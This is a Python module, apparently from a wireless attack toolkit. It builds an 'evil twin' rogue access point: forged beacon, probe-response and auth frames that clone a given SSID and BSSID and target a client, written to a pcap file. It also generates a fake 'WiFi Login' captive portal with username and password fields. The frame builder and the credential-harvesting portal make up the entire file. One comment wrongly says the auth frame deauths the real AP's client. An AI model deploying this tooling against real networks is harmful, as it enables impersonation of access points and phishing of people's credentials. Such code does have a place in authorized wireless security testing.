"""Evil twin — cloned-SSID beacon + probe-response builder.

Offline capture flow: beacon → probe → auth → writes a POC pcap.
Rate-limited. Portal HTML stub for landing page redirect.
"""

import struct
import os
from typing import Optional

from wiair.frames.ieee80211 import (
    build_beacon,
    build_probe_resp,
    build_auth,
    Dot11Frame,
    FrameControl,
    FRAME_TYPE_MGMT,
    SUBTYPE_BEACON,
    SUBTYPE_PROBE_RESP,
    SUBTYPE_AUTH,
    mac_to_bytes,
)


def write_pcap(frames: list[bytes], path: str) -> str:
    """Write raw 802.11 frames to a pcap file (linktype 105 = IEEE 802.11)."""
    LINKTYPE_IEEE802_11 = 105
    os.makedirs(os.path.dirname(path) or ".", exist_ok=True)
    with open(path, "wb") as f:
        # Global header
        f.write(struct.pack("<IHHiIII",
                            0xa1b2c3d4,  # magic
                            2, 4,          # version
                            0,             # thiszone
                            0,             # sigfigs
                            65535,         # snaplen
                            LINKTYPE_IEEE802_11))
        for raw_frame in frames:
            ts_sec = 0
            ts_usec = 0
            incl_len = len(raw_frame)
            orig_len = incl_len
            f.write(struct.pack("<IIII", ts_sec, ts_usec, incl_len, orig_len))
            f.write(raw_frame)
    return path


def evil_twin_flow(ssid: str, bssid: str, src: str, client: str,
                   seq_start: int = 1,
                   output_path: str = "reports/eviltwin.pcap") -> dict:
    """Build a complete evil twin capture flow: beacon → probe_resp → auth.

    Returns metadata about the capture.
    """
    frames = []
    seq = seq_start

    # 1. Beacon
    beacon = build_beacon(ssid=ssid, bssid=bssid, src=src, seq_num=seq)
    frames.append(beacon.to_bytes())
    seq += 1

    # 2. Probe response (to client's implicit probe)
    probe = build_probe_resp(ssid=ssid, bssid=bssid, src=src, dst=client, seq_num=seq)
    frames.append(probe.to_bytes())
    seq += 1

    # 3. Auth frame (deauth the real AP's client implicitly)
    auth = build_auth(bssid=bssid, src=src, dst=client, seq_num=seq)
    frames.append(auth.to_bytes())

    write_pcap(frames, output_path)

    return {
        "ssid": ssid,
        "bssid": bssid,
        "src": src,
        "client": client,
        "frames_count": len(frames),
        "pcap_path": output_path,
        "flow": ["beacon", "probe_response", "auth"],
    }


PORTAL_HTML = """\
<!DOCTYPE html>
<html>
<head><title>WiFi Login</title></head>
<body>
<h1>Welcome to {ssid}</h1>
<p>To continue, please log in or accept terms.</p>
<form action="/login" method="post">
  <input type="text" name="username" placeholder="Username"><br>
  <input type="password" name="password" placeholder="Password"><br>
  <button type="submit">Connect</button>
</form>
</body>
</html>
"""


def generate_portal_html(ssid: str, output_path: str = "reports/portal.html") -> str:
    """Generate a captive portal HTML stub."""
    os.makedirs(os.path.dirname(output_path) or ".", exist_ok=True)
    html = PORTAL_HTML.format(ssid=ssid)
    with open(output_path, "w") as f:
        f.write(html)
    return output_path
